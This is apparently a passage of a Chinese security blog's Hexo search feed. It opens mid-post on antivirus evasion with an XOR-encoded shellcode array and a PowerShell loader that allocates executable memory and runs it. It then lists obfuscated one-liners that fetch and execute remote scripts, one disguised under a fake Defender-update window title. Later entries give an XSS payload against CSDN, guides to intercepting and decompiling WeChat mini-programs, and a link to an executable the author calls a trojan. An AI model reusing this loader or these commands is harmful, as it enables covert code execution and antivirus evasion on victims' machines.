class="hljs-number">111,84,5,36</span>,<span class="hljs-number">220,246,18,220</span>,<span class="hljs-number">116,116,116,116</span>,<span class="hljs-number">116,75,25,117</span>,<span class="hljs-number">90,132,220,246</span>,<span class="hljs-number">202,167,35,35</span>,<span class="hljs-number">35,120,18,234</span>,<span class="hljs-number">114,114,73,32</span>,<span class="hljs-number">114,114,75,83</span>,<span class="hljs-number">142,35,35,112</span>,<span class="hljs-number">115,75,116,170</span>,<span class="hljs-number">188,229,220,246</span>,<span class="hljs-number">200,83,120,18</span>,<span class="hljs-number">241,113,75,35</span>,<span class="hljs-number">33,99,167,113</span>,<span class="hljs-number">113,113,112,113</span>,<span class="hljs-number">115,75,200,118</span>,<span class="hljs-number">13,24,220,246</span>,<span class="hljs-number">170,229,160,224</span>,<span class="hljs-number">115,18,220,116</span>,<span class="hljs-number">116,73,220,112</span>,<span class="hljs-number">117,75,14,37</span>,<span class="hljs-number">59,88,220,246</span>,<span class="hljs-number">166,227,44,167</span>,<span class="hljs-number">224,34,35,35</span>,<span class="hljs-number">18,220,166,213</span>,<span class="hljs-number">87,39,170,218</span>,<span class="hljs-number">200,42,75,137</span>,<span class="hljs-number">230,193,126,220</span>,<span class="hljs-number">246,170,226,75</span>,<span class="hljs-number">102,2,125,18</span>,<span class="hljs-number">220,246,18,220</span>,<span class="hljs-number">116,73,36,114</span>,<span class="hljs-number">117,115,75,148</span>,<span class="hljs-number">116,195,40,220</span>,<span class="hljs-number">246,156,35,12</span>,<span class="hljs-number">35,35,26,228</span>,<span class="hljs-number">87,148,18,220</span>,<span class="hljs-number">202,178,34,35</span>,<span class="hljs-number">35,202,234,34</span>,<span class="hljs-number">35,35,203,168</span>,<span class="hljs-number">220,220,220,12</span>,<span class="hljs-number">87,75,26,100</span>,<span class="hljs-number">35,22,108,2</span>,<span class="hljs-number">115,6,99,98</span>,<span class="hljs-number">115,120,23,127</span>,<span class="hljs-number">115,121,123,22</span>,<span class="hljs-number">23,11,115,125</span>,<span class="hljs-number">10,20,96,96</span>,<span class="hljs-number">10,20,94,7</span>,<span class="hljs-number">102,106,96,98</span>,<span class="hljs-number">113,14,112,119</span>,<span class="hljs-number">98,109,103,98</span>,<span class="hljs-number">113,103,14,98</span>,<span class="hljs-number">109,119,106,117</span>,<span class="hljs-number">106,113,118,112</span>,<span class="hljs-number">14,119,102,112</span>,<span class="hljs-number">119,14,101,106</span>,<span class="hljs-number">111,102,2,7</span>,<span class="hljs-number">107,8,107,9</span>,<span class="hljs-number">35,22,108,2</span>,<span class="hljs-number">115,6,35,118</span>,<span class="hljs-number">80,70,81,14</span>,<span class="hljs-number">98,68,70,77</span>,<span class="hljs-number">87,25,3,110</span>,<span class="hljs-number">76,89,74,79</span>,<span class="hljs-number">79,66,12,22</span>,<span class="hljs-number">13,19,3,11</span>,<span class="hljs-number">64,76,78,83</span>,<span class="hljs-number">66,87,74,65</span>,<span class="hljs-number">79,70,24,3</span>,<span class="hljs-number">110,112,106,102</span>,<span class="hljs-number">3,26,13,19</span>,<span class="hljs-number">24,3,116,74</span>,<span class="hljs-number">77,71,76,84</span>,<span class="hljs-number">80,3,109,119</span>,<span class="hljs-number">3,21,13,18</span>,<span class="hljs-number">24,3,116,108</span>,<span class="hljs-number">116,21,23,24</span>,<span class="hljs-number">3,119,81,74</span>,<span class="hljs-number">71,70,77,87</span>,<span class="hljs-number">12,22,13,19</span>,<span class="hljs-number">24,3,110,98</span>,<span class="hljs-number">112,97,10,46</span>,<span class="hljs-number">41,35,22,108</span>,<span class="hljs-number">2,115,6,99</span>,<span class="hljs-number">98,115,120,23</span>,<span class="hljs-number">127,115,121,123</span>,<span class="hljs-number">22,23,11,115</span>,<span class="hljs-number">125,10,20,96</span>,<span class="hljs-number">96,10,20,94</span>,<span class="hljs-number">7,102,106,96</span>,<span class="hljs-number">98,113,14,112</span>,<span class="hljs-number">119,98,109,103</span>,<span class="hljs-number">98,113,103,14</span>,<span class="hljs-number">98,109,119,106</span>,<span class="hljs-number">117,106,113,118</span>,<span class="hljs-number">112,14,119,102</span>,<span class="hljs-number">112,119,14,101</span>,<span class="hljs-number">106,111,102,2</span>,<span class="hljs-number">7,107,8,107</span>,<span class="hljs-number">9,35,22,108</span>,<span class="hljs-number">2,115,6,99</span>,<span class="hljs-number">98,115,120,23</span>,<span class="hljs-number">127,115,121,123</span>,<span class="hljs-number">22,23,11,115</span>,<span class="hljs-number">125,10,20,96</span>,<span class="hljs-number">96,10,20,94</span>,<span class="hljs-number">7,102,106,96</span>,<span class="hljs-number">98,113,14,112</span>,<span class="hljs-number">119,98,109,103</span>,<span class="hljs-number">98,113,103,14</span>,<span class="hljs-number">98,109,119,106</span>,<span class="hljs-number">117,106,113,118</span>,<span class="hljs-number">112,14,119,102</span>,<span class="hljs-number">112,119,14,101</span>,<span class="hljs-number">106,111,102,2</span>,<span class="hljs-number">7,107,8,107</span>,<span class="hljs-number">9,35,22,108</span>,<span class="hljs-number">2,115,6,99</span>,<span class="hljs-number">98,115,120,23</span>,<span class="hljs-number">127,115,121,123</span>,<span class="hljs-number">22,23,11,115</span>,<span class="hljs-number">125,10,20,96</span>,<span class="hljs-number">96,10,20,94</span>,<span class="hljs-number">7,102,106,96</span>,<span class="hljs-number">98,113,14,112</span>,<span class="hljs-number">119,98,109,103</span>,<span class="hljs-number">98,113,103,14</span>,<span class="hljs-number">98,109,119,106</span>,<span class="hljs-number">117,106,113,118</span>,<span class="hljs-number">112,14,119,102</span>,<span class="hljs-number">112,119,14,101</span>,<span class="hljs-number">106,111,102,2</span>,<span class="hljs-number">7,107,8,107</span>,<span class="hljs-number">9,35,22,108</span>,<span class="hljs-number">2,115,6,99</span>,<span class="hljs-number">98,115,35,75</span>,<span class="hljs-number">211,150,129,117</span>,<span class="hljs-number">220,246,73,99</span>,<span class="hljs-number">75,35,51,35</span>,<span class="hljs-number">35,75,35,35</span>,<span class="hljs-number">99,35,116,75</span>,<span class="hljs-number">123,135,112,198</span>,<span class="hljs-number">220,246,176,154</span>,<span class="hljs-number">35,35,35,35</span>,<span class="hljs-number">34,250,114,112</span>,<span class="hljs-number">170,196,116,75</span>,<span class="hljs-number">35,3,35,35</span>,<span class="hljs-number">112,117,75,49</span>,<span class="hljs-number">181,170,193,220</span>,<span class="hljs-number">246,166,227,87</span>,<span class="hljs-number">229,168,36,34</span>,<span class="hljs-number">224,166,227,86</span>,<span class="hljs-number">198,123,224,203</span>,<span class="hljs-number">138,222,220,220</span>,<span class="hljs-number">18,19,18,13</span>,<span class="hljs-number">18,16,17,13</span>,<span class="hljs-number">17,17,20,13</span>,<span class="hljs-number">17,17,20,35</span>,<span class="hljs-number">35,35,35,35</span>)<br><br>for ($x = <span class="hljs-number">0</span><span class="hljs-comment">; $x -lt $acode.Count; $x++) &#123;</span><br>$acode[$x] = $acode[$x] -bxor <span class="hljs-number">35</span><br>&#125;<br><br>$ava = [System.Runtime.InteropServices.Marshal]<span class="hljs-number">::</span>GetDelegateForFunctionPointer((func_b kernel32.dll VirtualAlloc), (func_a @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))<br>$abuffer = $ava.Invoke([IntPtr]<span class="hljs-number">::</span>Zero, $acode.Length, <span class="hljs-number">0</span>x3000, <span class="hljs-number">0</span>x40)<br>[System.Runtime.InteropServices.Marshal]<span class="hljs-number">::</span>Copy($acode, <span class="hljs-number">0</span>, $abuffer, $acode.length)<br><br>$arunme = [System.Runtime.InteropServices.Marshal]<span class="hljs-number">::</span>GetDelegateForFunctionPointer($abuffer, (func_a @([IntPtr]) ([Void])))<br>$arunme.Invoke([IntPtr]<span class="hljs-number">::</span>Zero)<br>&#x27;@<br><br>If ([IntPtr]<span class="hljs-number">::</span>size -eq <span class="hljs-number">8</span>) &#123;<br>start-job &#123; param($a) ie`x $a &#125; -RunAs32 -Argument $DoIt | wait-job | Receive-Job<br>&#125;<br>else &#123;<br>i`ex $DoIt<br>&#125;<br></code></pre></td></tr></table></figure><p>我们再放到virustotal上面试试<br><img src="https://s2.loli.net/2022/08/16/Eqp7YMwD8feWuVl.png"><br>28/60，也就多绕过了4个防火墙<br>还是太菜了，手动的话，大概就这样了，下面贴一下在执行远程执行脚本时代码混淆，直接执行cs生成的语句杀软拦截的混淆操作</p><ol><li><p>使用Replace替换关键字部分字母，加上通过拆分后重新组合<br><code>powershell.exe -nop -w hidden -c &quot;$c1=&#39;IEX(New-Object Net.WebClient).Downlo&#39;;$c2=&#39;123(&#39;&#39;http://0.0.0.0:4545/text.txt&#39;&#39;)&#39;.Replace(&#39;123&#39;,&#39;adString&#39;);IEX ($c1+$c2)&quot;</code></p></li><li><p>使用powershell语言的特性来混淆代码</p></li></ol><p><code>cmd.exe /c &quot;powershell -c Write-Host SUCCESS -Fore Green&quot;</code></p><p><code>cmd.exe /c &quot;echo Write-Host SUCCESS -Fore Green | powershell -&quot;</code></p><p><code>cmd /c &quot;set p1=power&amp;&amp; set p2=shell&amp;&amp; cmd /c echo Write-Host SUCCESS -Fore Green ^|%p1%%p2% -&quot;</code></p><p>管道输入流：</p><p><code>cmd.exe /c &quot;echo Write-Host SUCCESS -Fore Green | powershell IEX $input&quot;</code></p><p>利用环境变量：</p><p><code>cmd.exe /c &quot;set cmd=Write-Host ENV -Fore Green&amp;&amp;powershell IEX $env:cmd&quot;</code></p><p><code>cmd.exe /c &quot;set cmd=Write-Host ENV -Fore Green&amp;&amp;cmd /c echo %cmd%|powershell -</code></p><p><code>cmd.exe /c &quot;set cmd=Write-Host ENV -Fore Green&amp;&amp;powershell IEX ([Environment]::GetEnvironmentVariable(&#39;cmd&#39;, &#39;Process&#39;))</code></p><p><code>cmd.exe /c &quot;set cmd=Write-Host ENV -Fore Green&amp;&amp;powershell IEX ((Get-ChildItem/ChildItem/GCI/DIR/LS env:cmd).Value)</code></p><p>从其他进程获取参数：</p><p><code>cmd /c &quot;title WINDOWS_DEFENDER_UPDATE&amp;&amp;echo IEX (IWR https://7ell.me/power)&amp;&amp; FOR /L %i IN (1,1,1000) DO echo&quot;</code></p><hr><p><a href="https://mp.weixin.qq.com/s/TtKEnmUbtVMSqBCgrSj2Qw">参考文章</a></p>]]></content>
      
      
      <categories>
          
          <category> 免杀 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 免杀 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次csdn的xss漏洞</title>
      <link href="2022/07/06/%E8%AE%B0%E4%B8%80%E6%AC%A1csdn%E7%9A%84xss%E6%BC%8F%E6%B4%9E/"/>
      <url>2022/07/06/%E8%AE%B0%E4%B8%80%E6%AC%A1csdn%E7%9A%84xss%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<p><img src="https://s2.loli.net/2022/07/06/uzAU24HoCVOB1kS.png"><br>csdn存在“猜你想搜”，并将其值存在placeholder中</p><p>在搜索xss相关信息后，将会推荐，</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;img src=<span class="hljs-number">1</span> onerror=alert(<span class="hljs-number">1</span>)&gt;<br></code></pre></td></tr></table></figure><p>如下图所示<br><img src="https://s2.loli.net/2022/07/06/mvx5pW2u6fUTLi3.png"><br>xss的执行语句被放到了placeholder中，且没有过滤</p><p>存在xss漏洞，成果如下图所示</p><p><img src="https://s2.loli.net/2022/07/06/BAbNqDlcxWEdgFK.png"></p><blockquote><p>成果<br><a href="/files/csdn_xss.mp4">成果演示</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> others </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>小程序渗透3</title>
      <link href="2022/05/01/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F3/"/>
      <url>2022/05/01/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F3/</url>
      
        <content type="html"><![CDATA[<h1 id="微信小程序渗透测试（反编译）"><a href="#微信小程序渗透测试（反编译）" class="headerlink" title="微信小程序渗透测试（反编译）"></a>微信小程序渗透测试（反编译）</h1><p>微信小程序反编译</p><a id="more"></a><p>代理的配置，成功抓包后，接下来就是对微信小程序的源码分析<br>首先下载微信<br>（注意：如果现在仍然挂着代理，将会无法正常下载微信）</p><p>我们在模拟器里登录微信，随便选择一个小程序打开</p><p>打开文件管理器，在会生成一个md5加密命名的文件夹（如果打开微信小程序过多，同时有多个文件夹不容易识别的情况，可以选择把文件夹所有内容删除掉，再去重新打开微信小程序，就会得到唯一一个MD5加密命名的文件夹）<br>在如图所示的路径下，能看到该小程序的文件夹<br><img src="https://s2.loli.net/2022/05/02/rkYKtlQaqmP8UH1.png"></p><p>一般都在/appbrand/pkg目录下，会看到带有后缀为wxapkg的文件<br>需要将其一一拷贝到本地主机下<br>注意：将整个文件夹复制大概率会使得文件管理系统停止工作而失败，所以需要一个一个文件的拷贝（确实麻烦！）</p><p>在夜神模拟器中，打开文件助手，找到模拟器与本地主机的共享文件夹<br><img src="https://s2.loli.net/2022/05/02/9oGFHnSsMeY4lUu.png"></p><p>开始拷贝文件（图形化交互确实慢。。）<br><img src="https://s2.loli.net/2022/05/02/kaIZgyobT6QuKth.png"></p><p>拷贝完文件之后，就是反编译了<br><a href="https://github.com/ezshine/wxapkg-convertor/releases"> GUI 界面的反编译工具</a></p><p>将文件拖入即可<br><img src="https://s2.loli.net/2022/05/02/Zng49N3rG5YmhQU.png"></p><p>所有的wxapkg文件编译完成<br><img src="https://s2.loli.net/2022/05/02/4oEBJD6SzH2LPuC.png"></p><p>接下来就是源码审计了<br><img src="https://s2.loli.net/2022/05/02/Shz3byPwKoZHd2l.png"></p>]]></content>
      
      
      <categories>
          
          <category> Android </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小程序渗透2</title>
      <link href="2022/05/01/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F2/"/>
      <url>2022/05/01/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F2/</url>
      
        <content type="html"><![CDATA[<h1 id="微信小程序渗透测试（抓包）"><a href="#微信小程序渗透测试（抓包）" class="headerlink" title="微信小程序渗透测试（抓包）"></a>微信小程序渗透测试（抓包）</h1><p>微信小程序抓包2</p><a id="more"></a><p>安卓7.0版本之后，模拟器无法正常下载证书，<br>导入的证书分为系统证书和用户证书。<br>之前导入的为用户证书，需要将其改为系统证书</p><p>使用openssl将证书格式转换<br>自行下载openssl（我这里使用的是kali自带的openssl）<br>查看是否已经安装openssl<br><img src="https://s2.loli.net/2022/05/01/BjFawSielCuV2ML.png"></p><p>将证书从der变为pem格式<br><img src="https://s2.loli.net/2022/05/01/SfeK6nDtphCFOZA.png"></p><p>打开夜神模拟器，根目录会有nox_adb.exe文件，用命令行去操控这个文件。（如果不是用夜神模拟器，也可以自己下载adb 工具，原理一样）<br><img src="https://s2.loli.net/2022/05/01/aSQtqwEZOBzTUIi.png"></p><p>从命令行里使用<br>首先检查其是否连接成功<br><img src="https://s2.loli.net/2022/05/01/kXPzrBoqd83ZFsi.png"><br>再切换到root模式，并改为可读写<br><img src="https://s2.loli.net/2022/05/01/m18nsXhLcHu3oiB.png"></p><p>查看该证书的hash值<br><img src="https://s2.loli.net/2022/05/01/aDwJW1LTkhKtF8p.png"></p><p>拷贝该证书，重命名为 hash结果里面的名称 <strong>注意这里要在名称后加.</strong><br><img src="https://s2.loli.net/2022/05/01/9E8fDIAmU2SsrQM.png"><br>这样就算完成了</p><p>PS:但是证书仍然会出现问题，目前还没找到解决的办法，但能成功抓包<br>所以还是建议使用7.0版本之前的安卓</p>]]></content>
      
      
      <categories>
          
          <category> Android </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小程序渗透1</title>
      <link href="2022/05/01/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F1/"/>
      <url>2022/05/01/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F1/</url>
      
        <content type="html"><![CDATA[<h1 id="微信小程序渗透测试（抓包）"><a href="#微信小程序渗透测试（抓包）" class="headerlink" title="微信小程序渗透测试（抓包）"></a>微信小程序渗透测试（抓包）</h1><p>考虑到微信小程序大多是外包开发，且高校的小程序部分为学生开发，相比于站点，安全性较低，尝试去对微信小程序进行渗透</p><a id="more"></a><p>这是基于安卓7.0之前<br><a href="https://silver-glacier.github.io/2022/05/01/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F2/">7.0之后看这里</a></p><p>首先准备好一个安卓模拟器，我在这里使用的是夜神模拟器</p><p><img src="https://s2.loli.net/2022/05/01/KMcdE8il9Yu6NPW.png"><br>首先切换到root模式</p><p>给burpsuite加上本地IP的端口监听，如果是在虚拟机上实现，则加上对应的IP端口<br><img src="https://s2.loli.net/2022/05/01/gdYsDOaTp1z6tJn.png"></p><p>打开模拟器的网络连接设置，长按WiredSSID，修改网络，进入高级设置<br><img src="https://s2.loli.net/2022/05/01/51PevgYNJSsj9kt.png"></p><p>设置为手动代理，加上与burpsuite上相对应的IP以及端口号<br><img src="https://s2.loli.net/2022/05/01/8N2LTMwHvJIUsCW.png"></p><p>从浏览器打开相应的IP以及端口，下载相应的burpsuite的证书<br>（这里只是为了下载相应的证书，也可以从本地下载下来，再放入到模拟器中）<br><img src="https://s2.loli.net/2022/05/01/usxnIrJd4vCVqNA.png"></p><p>下载完成后，打开模拟器自带的文件管理系统，下载的证书将在download中<br><strong>这里注意！下载下来的证书很可能是灰色的，需要将后缀改为crt，der后缀文件可能存在识别错误的问题</strong><br><strong>其他问题：可能存在证书在download目录下也无法正常导入，需要将其移入其他目录（本人再这里未遇到该问题）</strong><br><img src="https://s2.loli.net/2022/05/01/lI4A7bcEVMZ2Nso.png"></p><p>成功导入证书后就完成了<br>我们打开百度测试一下<br><img src="https://s2.loli.net/2022/05/01/IiamvHD4TNAMSZP.png" alt="成功抓包"></p><p><a href="https://silver-glacier.github.io/2022/05/01/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F2/">如果提示证书安全问题看这里</a></p>]]></content>
      
      
      <categories>
          
          <category> Android </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Welcome</title>
      <link href="2021/12/04/Welcome/"/>
      <url>2021/12/04/Welcome/</url>
      
        <content type="html"><![CDATA[<p><img src="/files/Welcome.jpg" alt="Welcome to my blog"><br><a href="/files/1111.exe">这是个🐎</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>The first try</title>
      <link href="2020/12/17/The%20first%20try/"/>
      <url>2020/12/17/The%20first%20try/</url>
      
        <content type="html"><![CDATA[<h1 id="标签"><a href="#标签" class="headerlink" title="标签"></a>标签</h1><blockquote><p>引用</p></blockquote><hr><p><em>斜体</em><br><strong>加粗</strong></p><p>！<a href="%E5%9B%BE%E7%89%87%E9%93%BE%E6%8E%A5">说明</a></p><p><a href="http://baidu.com/">百度</a></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> i=<span class="hljs-string">&quot;代码块&quot;</span><br></code></pre></td></tr></table></figure><ul><li>列表</li><li>列表</li></ul><ol><li>列表</li><li>列表</li></ol><table><thead><tr><th align="center">表头</th><th align="left">表头</th><th align="right">表头</th></tr></thead><tbody><tr><td align="center">1</td><td align="left">2</td><td align="right">3</td></tr></tbody></table><p><del>删除</del></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="2020/12/16/hello-world/"/>
      <url>2020/12/16/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
